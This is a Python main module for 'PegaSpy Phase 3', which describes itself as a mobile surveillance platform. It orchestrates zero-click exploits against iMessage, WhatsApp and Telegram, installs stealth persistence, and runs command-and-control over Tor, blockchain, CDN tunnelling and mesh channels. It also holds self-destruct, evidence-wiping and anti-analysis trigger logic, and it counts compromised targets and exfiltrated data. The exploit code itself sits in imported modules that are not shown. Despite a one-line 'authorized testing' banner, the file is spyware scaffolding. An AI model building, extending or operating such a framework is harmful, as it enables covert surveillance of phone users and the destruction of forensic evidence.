#!/usr/bin/env python3
"""
PegaSpy Phase 3 - Main Application
Advanced mobile surveillance platform with zero-click exploits, deep OS control,
stealthy self-destruct logic, and globe-spanning anonymized C2 network
"""

import os
import sys
import time
import json
import asyncio
import logging
import argparse
import threading
from pathlib import Path
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, asdict
from datetime import datetime

# Import PegaSpy components
from zero_click_exploits import (
    ExploitManager, ExploitType, ExploitStatus, 
    iMessageExploit, WhatsAppExploit, TelegramExploit
)
from persistence import (
    PersistenceManager, PersistenceMethod, PersistenceStatus
)
from c2_infrastructure import (
    TorNetworkManager, BlockchainC2Manager, 
    CDNTunnelingManager, MeshNetworkManager
)
from self_destruct import (
    DestructionEngine, StealthWiper, 
    EvidenceEliminator, TriggerManager
)
from web_dashboard.app import create_app

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('pegaspy.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

@dataclass
class PegaSpyConfig:
    """PegaSpy configuration"""
    # Web dashboard
    web_host: str = "127.0.0.1"
    web_port: int = 8080
    web_debug: bool = False
    web_secret_key: str = "pegaspy_secret_key_change_in_production"
    
    # C2 Infrastructure
    tor_enabled: bool = True
    blockchain_enabled: bool = True
    cdn_enabled: bool = True
    mesh_enabled: bool = True
    
    # Self-destruct configuration (disabled for development)
    auto_destruct_enabled: bool = False
    destruct_time_limit: int = 24 * 3600  # 24 hours
    
    # Exploits
    imessage_enabled: bool = True
    whatsapp_enabled: bool = True
    telegram_enabled: bool = True
    
    # Persistence
    persistence_enabled: bool = True
    stealth_mode: bool = True
    
    # Security and anti-analysis (disabled for development)
    anti_analysis: bool = False
    vm_detection: bool = False
    debugger_detection: bool = False
    
    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)
    
    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> 'PegaSpyConfig':
        return cls(**data)
    
    def save(self, config_path: str):
        """Save configuration to file"""
        with open(config_path, 'w') as f:
            json.dump(self.to_dict(), f, indent=2)
    
    @classmethod
    def load(cls, config_path: str) -> 'PegaSpyConfig':
        """Load configuration from file"""
        try:
            with open(config_path, 'r') as f:
                data = json.load(f)
            return cls.from_dict(data)
        except Exception as e:
            logger.warning(f"Failed to load config: {e}, using defaults")
            return cls()

class PegaSpy:
    """Main PegaSpy application class"""
    
    def __init__(self, config: Optional[PegaSpyConfig] = None):
        self.config = config or PegaSpyConfig()
        self.is_running = False
        self.start_time = time.time()
        
        # Core components
        self.exploit_manager: Optional[ExploitManager] = None
        self.persistence_manager: Optional[PersistenceManager] = None
        self.destruction_engine: Optional[DestructionEngine] = None
        self.trigger_manager: Optional[TriggerManager] = None
        
        # C2 Infrastructure
        self.tor_manager: Optional[TorNetworkManager] = None
        self.blockchain_manager: Optional[BlockchainC2Manager] = None
        self.cdn_manager: Optional[CDNTunnelingManager] = None
        self.mesh_manager: Optional[MeshNetworkManager] = None
        
        # Web application
        self.web_app = None
        self.web_thread: Optional[threading.Thread] = None
        
        # Statistics
        self.stats = {
            'start_time': self.start_time,
            'exploits_launched': 0,
            'targets_compromised': 0,
            'data_exfiltrated': 0,
            'c2_connections': 0,
            'triggers_fired': 0,
            'destructions_executed': 0
        }
        
        logger.info("PegaSpy initialized")
    
    async def initialize(self) -> bool:
        """Initialize all PegaSpy components"""
        try:
            logger.info("Initializing PegaSpy components...")
            
            # Initialize exploit manager
            if not await self._init_exploit_manager():
                logger.error("Failed to initialize exploit manager")
                return False
            
            # Initialize persistence manager
            if not await self._init_persistence_manager():
                logger.error("Failed to initialize persistence manager")
                return False
            
            # Initialize C2 infrastructure
            if not await self._init_c2_infrastructure():
                logger.error("Failed to initialize C2 infrastructure")
                return False
            
            # Initialize self-destruct system
            if not await self._init_self_destruct():
                logger.error("Failed to initialize self-destruct system")
                return False
            
            # Initialize web dashboard
            if not self._init_web_dashboard():
                logger.error("Failed to initialize web dashboard")
                return False
            
            logger.info("All PegaSpy components initialized successfully")
            return True
            
        except Exception as e:
            logger.error(f"Initialization failed: {e}")
            return False
    
    async def _init_exploit_manager(self) -> bool:
        """Initialize exploit manager"""
        try:
            self.exploit_manager = ExploitManager()
            
            # Add available exploits
            if self.config.imessage_enabled:
                imessage_exploit = iMessageExploit()
                self.exploit_manager.add_exploit("imessage", imessage_exploit)
            
            if self.config.whatsapp_enabled:
                whatsapp_exploit = WhatsAppExploit()
                self.exploit_manager.add_exploit("whatsapp", whatsapp_exploit)
            
            if self.config.telegram_enabled:
                telegram_exploit = TelegramExploit()
                self.exploit_manager.add_exploit("telegram", telegram_exploit)
            
            logger.info(f"Exploit manager initialized with {len(self.exploit_manager.exploits)} exploits")
            return True
            
        except Exception as e:
            logger.error(f"Exploit manager initialization failed: {e}")
            return False
    
    async def _init_persistence_manager(self) -> bool:
        """Initialize persistence manager"""
        try:
            self.persistence_manager = PersistenceManager()
            
            if self.config.persistence_enabled:
                # Install persistence mechanisms
                success = self.persistence_manager.install_persistence(
                    stealth_mode=self.config.stealth_mode
                )
                if not success:
                    logger.warning("Some persistence mechanisms failed to install")
            
            logger.info("Persistence manager initialized")
            return True
            
        except Exception as e:
            logger.error(f"Persistence manager initialization failed: {e}")
            return False
    
    async def _init_c2_infrastructure(self) -> bool:
        """Initialize C2 infrastructure"""
        try:
            # Initialize Tor network
            if self.config.tor_enabled:
                self.tor_manager = TorNetworkManager()
                await self.tor_manager.initialize()
                logger.info("Tor network manager initialized")
            
            # Initialize blockchain C2
            if self.config.blockchain_enabled:
                self.blockchain_manager = BlockchainC2Manager()
                await self.blockchain_manager.initialize()
                logger.info("Blockchain C2 manager initialized")
            
            # Initialize CDN tunneling
            if self.config.cdn_enabled:
                self.cdn_manager = CDNTunnelingManager()
                await self.cdn_manager.initialize()
                logger.info("CDN tunneling manager initialized")
            
            # Initialize mesh network
            if self.config.mesh_enabled:
                self.mesh_manager = MeshNetworkManager()
                await self.mesh_manager.initialize()
                logger.info("Mesh network manager initialized")
            
            logger.info("C2 infrastructure initialized")
            return True
            
        except Exception as e:
            logger.error(f"C2 infrastructure initialization failed: {e}")
            return False
    
    async def _init_self_destruct(self) -> bool:
        """Initialize self-destruct system"""
        try:
            # Initialize destruction engine
            self.destruction_engine = DestructionEngine()
            
            # Initialize trigger manager
            self.trigger_manager = TriggerManager()
            
            # Set up trigger callback
            self.trigger_manager.set_trigger_callback(self._handle_trigger_event)
            
            # Add default triggers
            if self.config.auto_destruct_enabled:
                self.trigger_manager.add_default_triggers()
                
                # Activate security triggers
                if self.config.anti_analysis:
                    self.trigger_manager.activate_trigger("debugger_detection")
                    self.trigger_manager.activate_trigger("analysis_tools_detection")
                
                if self.config.vm_detection:
                    self.trigger_manager.activate_trigger("vm_detection")
                
                # Activate time-based trigger
                self.trigger_manager.activate_trigger("time_limit")
                
                # Start monitoring
                await self.trigger_manager.start_monitoring()
            
            logger.info("Self-destruct system initialized")
            return True
            
        except Exception as e:
            logger.error(f"Self-destruct initialization failed: {e}")
            return False
    
    def _init_web_dashboard(self) -> bool:
        """Initialize web dashboard"""
        try:
            # Create Flask app with PegaSpy instance
            self.web_app = create_app(self)
            
            logger.info("Web dashboard initialized")
            return True
            
        except Exception as e:
            logger.error(f"Web dashboard initialization failed: {e}")
            return False
    
    async def _handle_trigger_event(self, event):
        """Handle trigger events"""
        try:
            logger.warning(f"TRIGGER EVENT: {event.trigger_id} - {event.description}")
            
            self.stats['triggers_fired'] += 1
            
            # Execute appropriate response based on trigger priority
            if event.priority.value >= 4:  # Critical or Emergency
                logger.critical("CRITICAL TRIGGER - INITIATING EMERGENCY DESTRUCTION")
                await self._emergency_destruct()
            elif event.priority.value >= 3:  # High priority
                logger.warning("HIGH PRIORITY TRIGGER - INITIATING STANDARD DESTRUCTION")
                await self._standard_destruct()
            
        except Exception as e:
            logger.error(f"Trigger event handling failed: {e}")
    
    async def _emergency_destruct(self):
        """Execute emergency destruction"""
        try:
            logger.critical("EMERGENCY DESTRUCTION INITIATED")
            
            if self.destruction_engine:
                # Execute scorched earth destruction
                await self.destruction_engine.execute_destruction(
                    scope="scorched_earth",
                    emergency=True
                )
                
                self.stats['destructions_executed'] += 1
            
            # Burn all C2 infrastructure
            await self._burn_c2_infrastructure()
            
            # Stop all operations
            await self.shutdown(emergency=True)
            
        except Exception as e:
            logger.error(f"Emergency destruction failed: {e}")
    
    async def _standard_destruct(self):
        """Execute standard destruction"""
        try:
            logger.warning("STANDARD DESTRUCTION INITIATED")
            
            if self.destruction_engine:
                # Execute extensive destruction
                await self.destruction_engine.execute_destruction(
                    scope="extensive",
                    emergency=False
                )
                
                self.stats['destructions_executed'] += 1
            
        except Exception as e:
            logger.error(f"Standard destruction failed: {e}")
    
    async def _burn_c2_infrastructure(self):
        """Burn all C2 infrastructure"""
        try:
            logger.warning("BURNING C2 INFRASTRUCTURE")
            
            # Burn Tor network
            if self.tor_manager:
                await self.tor_manager.emergency_burn()
            
            # Burn blockchain C2
            if self.blockchain_manager:
                await self.blockchain_manager.emergency_burn()
            
            # Burn CDN tunneling
            if self.cdn_manager:
                await self.cdn_manager.emergency_burn()
            
            # Burn mesh network
            if self.mesh_manager:
                await self.mesh_manager.emergency_burn()
            
            logger.warning("C2 infrastructure burned")
            
        except Exception as e:
            logger.error(f"C2 burn failed: {e}")
    
    def start_web_dashboard(self):
        """Start web dashboard in separate thread"""
        try:
            def run_web_app():
                self.web_app.run(
                    host=self.config.web_host,
                    port=self.config.web_port,
                    debug=self.config.web_debug,
                    threaded=True
                )
            
            self.web_thread = threading.Thread(target=run_web_app, daemon=True)
            self.web_thread.start()
            
            logger.info(f"Web dashboard started on http://{self.config.web_host}:{self.config.web_port}")
            return True
            
        except Exception as e:
            logger.error(f"Failed to start web dashboard: {e}")
            return False
    
    async def start(self) -> bool:
        """Start PegaSpy"""
        try:
            logger.info("Starting PegaSpy...")
            
            # Initialize components
            if not await self.initialize():
                logger.error("Initialization failed")
                return False
            
            # Start web dashboard
            if not self.start_web_dashboard():
                logger.error("Failed to start web dashboard")
                return False
            
            self.is_running = True
            logger.info("PegaSpy started successfully")
            
            # Print startup information
            self._print_startup_info()
            
            return True
            
        except Exception as e:
            logger.error(f"Failed to start PegaSpy: {e}")
            return False
    
    def _print_startup_info(self):
        """Print startup information"""
        print("\n" + "="*60)
        print("🕷️  PegaSpy Phase 3 - Advanced Mobile Surveillance Platform")
        print("="*60)
        print(f"📊 Web Dashboard: http://{self.config.web_host}:{self.config.web_port}")
        print(f"🎯 Exploits Available: {len(self.exploit_manager.exploits) if self.exploit_manager else 0}")
        print(f"🌐 C2 Networks: {sum([1 for m in [self.tor_manager, self.blockchain_manager, self.cdn_manager, self.mesh_manager] if m])}")
        print(f"🔥 Self-Destruct: {'Armed' if self.config.auto_destruct_enabled else 'Disabled'}")
        print(f"🛡️  Anti-Analysis: {'Enabled' if self.config.anti_analysis else 'Disabled'}")
        print("="*60)
        print("⚠️  WARNING: This is for authorized security testing only!")
        print("="*60 + "\n")
    
    async def shutdown(self, emergency: bool = False) -> bool:
        """Shutdown PegaSpy"""
        try:
            logger.info(f"Shutting down PegaSpy (emergency={emergency})...")
            
            self.is_running = False
            
            # Stop trigger monitoring
            if self.trigger_manager:
                if emergency:
                    await self.trigger_manager.emergency_stop()
                else:
                    await self.trigger_manager.stop_monitoring()
            
            # Shutdown C2 infrastructure
            if self.tor_manager:
                await self.tor_manager.shutdown()
            
            if self.blockchain_manager:
                await self.blockchain_manager.shutdown()
            
            if self.cdn_manager:
                await self.cdn_manager.shutdown()
            
            if self.mesh_manager:
                await self.mesh_manager.shutdown()
            
            # Clean up persistence if not emergency
            if self.persistence_manager and not emergency:
                await self.persistence_manager.cleanup_persistence()
            
            logger.info("PegaSpy shutdown complete")
            return True
            
        except Exception as e:
            logger.error(f"Shutdown failed: {e}")
            return False
    
    def get_status(self) -> Dict[str, Any]:
        """Get current PegaSpy status"""
        uptime = time.time() - self.start_time
        
        status = {
            'is_running': self.is_running,
            'uptime': uptime,
            'start_time': self.start_time,
            'config': self.config.to_dict(),
            'stats': self.stats.copy(),
            'components': {
                'exploit_manager': self.exploit_manager is not None,
                'persistence_manager': self.persistence_manager is not None,
                'destruction_engine': self.destruction_engine is not None,
                'trigger_manager': self.trigger_manager is not None,
                'tor_manager': self.tor_manager is not None,
                'blockchain_manager': self.blockchain_manager is not None,
                'cdn_manager': self.cdn_manager is not None,
                'mesh_manager': self.mesh_manager is not None
            }
        }
        
        # Add component-specific status
        if self.exploit_manager:
            status['exploits'] = self.exploit_manager.get_status()
        
        if self.persistence_manager:
            status['persistence'] = self.persistence_manager.get_status()
        
        if self.trigger_manager:
            status['triggers'] = self.trigger_manager.get_trigger_status()
        
        if self.destruction_engine:
            status['destruction'] = self.destruction_engine.get_status()
        
        # Add C2 status
        status['c2'] = {}
        if self.tor_manager:
            status['c2']['tor'] = self.tor_manager.get_status()
        
        if self.blockchain_manager:
            status['c2']['blockchain'] = self.blockchain_manager.get_status()
        
        if self.cdn_manager:
            status['c2']['cdn'] = self.cdn_manager.get_status()
        
        if self.mesh_manager:
            status['c2']['mesh'] = self.mesh_manager.get_status()
        
        return status
    
    async def launch_exploit(self, exploit_type: str, target: str, options: Dict[str, Any] = None) -> Dict[str, Any]:
        """Launch an exploit against a target"""
        try:
            if not self.exploit_manager:
                return {'success': False, 'error': 'Exploit manager not initialized'}
            
            # Find exploit
            exploit = None
            for exp in self.exploit_manager.exploits.values():
                if exp.exploit_type.value == exploit_type:
                    exploit = exp
                    break
            
            if not exploit:
                return {'success': False, 'error': f'Exploit {exploit_type} not found'}
            
            # Launch exploit
            result = await self.exploit_manager.launch_exploit(
                exploit_id=exploit.exploit_id,
                target=target,
                options=options or {}
            )
            
            if result.get('success'):
                self.stats['exploits_launched'] += 1
                if result.get('compromised'):
                    self.stats['targets_compromised'] += 1
            
            return result
            
        except Exception as e:
            logger.error(f"Exploit launch failed: {e}")
            return {'success': False, 'error': str(e)}
    
    async def manual_destruct(self, scope: str = "standard") -> Dict[str, Any]:
        """Manually trigger destruction"""
        try:
            if not self.destruction_engine:
                return {'success': False, 'error': 'Destruction engine not initialized'}
            
            result = await self.destruction_engine.execute_destruction(
                scope=scope,
                emergency=False
            )
            
            if result.get('success'):
                self.stats['destructions_executed'] += 1
            
            return result
            
        except Exception as e:
            logger.error(f"Manual destruction failed: {e}")
            return {'success': False, 'error': str(e)}

async def main():
    """Main function"""
    parser = argparse.ArgumentParser(description='PegaSpy Phase 3 - Advanced Mobile Surveillance Platform')
    parser.add_argument('--config', '-c', help='Configuration file path', default='pegaspy_config.json')
    parser.add_argument('--host', help='Web dashboard host', default='127.0.0.1')
    parser.add_argument('--port', '-p', type=int, help='Web dashboard port', default=8080)
    parser.add_argument('--debug', action='store_true', help='Enable debug mode')
    parser.add_argument('--no-auto-destruct', action='store_true', help='Disable auto-destruct')
    parser.add_argument('--no-persistence', action='store_true', help='Disable persistence')
    
    args = parser.parse_args()
    
    # Load or create configuration
    if os.path.exists(args.config):
        config = PegaSpyConfig.load(args.config)
    else:
        config = PegaSpyConfig()
        config.save(args.config)
        logger.info(f"Created default configuration: {args.config}")
    
    # Override config with command line arguments
    if args.host:
        config.web_host = args.host
    if args.port:
        config.web_port = args.port
    if args.debug:
        config.web_debug = True
    if args.no_auto_destruct:
        config.auto_destruct_enabled = False
    if args.no_persistence:
        config.persistence_enabled = False
    
    # Create and start PegaSpy
    pegaspy = PegaSpy(config)
    
    try:
        # Start PegaSpy
        if not await pegaspy.start():
            logger.error("Failed to start PegaSpy")
            return 1
        
        # Keep running until interrupted
        try:
            while pegaspy.is_running:
                await asyncio.sleep(1.0)
        except KeyboardInterrupt:
            logger.info("Received interrupt signal")
        
        # Shutdown
        await pegaspy.shutdown()
        return 0
        
    except Exception as e:
        logger.error(f"PegaSpy error: {e}")
        await pegaspy.shutdown(emergency=True)
        return 1

if __name__ == "__main__":
    try:
        exit_code = asyncio.run(main())
        sys.exit(exit_code)
    except KeyboardInterrupt:
        print("\nPegaSpy interrupted")
        sys.exit(0)
    except Exception as e:
        print(f"Fatal error: {e}")
        sys.exit(1)